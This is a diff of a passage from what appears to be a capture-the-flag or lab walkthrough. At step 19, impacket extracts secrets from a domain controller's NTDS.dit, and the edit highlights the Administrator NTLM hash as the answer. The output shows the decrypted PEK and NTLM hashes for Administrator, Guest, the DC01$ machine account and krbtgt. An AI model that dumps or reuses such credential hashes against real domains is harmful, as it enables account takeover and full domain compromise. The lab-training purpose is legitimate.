@@ -276,7 +276,7 @@ Step19. Now we will extract the secrets via impacket command and we will get our
 [*] Searching for pekList, be patient
 [*] PEK # 0 found and decrypted: 9bf8b490fffee672ecfe3bc67e0daf69
 [*] Reading and decrypting hashes from NTDS.dit 
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
+==**Administrator:500:aad3b435b51404eeaad3b435b51404ee:**36e09e1e6ade94d63fbcab5e5b8d6d23**:::**== this is the answer we need.
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DC01$:1002:aad3b435b51404eeaad3b435b51404ee:60b488a143608d77968aceebe7b65940:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:11dee8f685882eb4f78a450291569bd0:::
